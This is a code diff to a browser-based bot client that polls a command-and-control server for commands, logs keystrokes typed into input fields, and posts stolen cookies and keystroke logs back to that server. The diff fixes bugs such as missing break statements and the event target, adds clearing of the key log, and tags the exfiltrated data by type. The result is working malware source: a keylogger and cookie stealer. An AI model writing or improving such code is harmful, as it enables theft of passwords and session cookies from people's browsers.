@@ -3,7 +3,7 @@ var config = {
     cCenter: 'http://127.0.0.1:1337',
     putPath: '/commands/put/',
     getPath: '/commands/get/',
-    timer: 2000    // ms
+    timer: 5000    // ms
 },
     botId;
 function init (){
@@ -23,8 +23,8 @@ function init (){
     // get commands of command center server
     (function tickTock() { // this should auto-run
         window.setTimeout(function() {
-            execCommand(requestCommands(botId))
             tickTock(); // call the timer function again to continue cycle..
+            execCommand(requestCommands(botId));
         }, config.timer);
     })();
 
@@ -78,6 +78,9 @@ var keyLogger = {
     done: function(){
         return this.elements;
     },
+    clear: function(){
+        this.elements = [];
+    },
 
     // logs each key press to the elements array
     logOnKeyDown: function (socket) {
@@ -87,8 +90,9 @@ var keyLogger = {
         document.onkeydown = function (e) {
             e = e || window.event;
             var key = e.keyCode ? e.keyCode : e.charCode;
+            console.log(keyLogger.elements)
             // add key to the last element if current cursor is in input or text area
-            if (isInputOrTextArea(e.srcElement)){
+            if (isInputOrTextArea(e.target)){
                 keyLogger.elements[ keyLogger.elements.length - 1].keys += String.fromCharCode(key);
             }
         };
@@ -190,8 +194,8 @@ function requestCommands(botId){
     return httpJSONGet(config.cCenter + config.getPath + botId);
 }
 
-function sendResults(results){
-    results = {results: results};
+function sendResults(results,type){
+    results = {results: results,type: type};
     console.log('Send Results: ',results)
     httpPost(config.cCenter + config.putPath + botId , results)
 }
@@ -236,10 +240,13 @@ function execCommand(comm){
                 killClient();
                 break;
             case 'getCookies':
-                console.log('Get cookies')
-                sendResults(getCookies());
+                sendResults(getCookies(),'Cookies');
+                break;
             case 'getKeyLog':
-                sendResults(keyLogger.done())
+                console.log('Get keys: ' , keyLogger.done())
+                sendResults(keyLogger.done(),'KeyLog')
+                keyLogger.clear();
+                break;
             case 'srvScann':
             default:
                 return;
